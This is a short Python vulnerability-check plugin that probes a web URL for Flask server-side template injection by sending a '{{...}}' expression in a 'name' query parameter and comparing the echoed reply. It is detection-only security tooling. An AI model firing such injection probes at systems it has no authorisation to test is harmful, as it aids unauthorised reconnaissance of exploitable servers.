#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class Ssti_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Falsk SSTI漏洞',
            'description': 'Falsk SSTI注入漏洞,可执行任意命令',
            'date': '',
            'exptype': 'check',
            'type': 'Inject'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }
        self.capta = get_capta()
        self.check_payload = '?name={{%s}}' %(self.capta)
    
    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.get(self.url + self.check_payload, headers = self.headers)
            if await check_req.text() == 'Hello %s' %(self.capta) and check_req.status == 200:
                return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    SSTI = Ssti_BaseVerify('http://192.168.30.242:8000')
    SSTI.check()
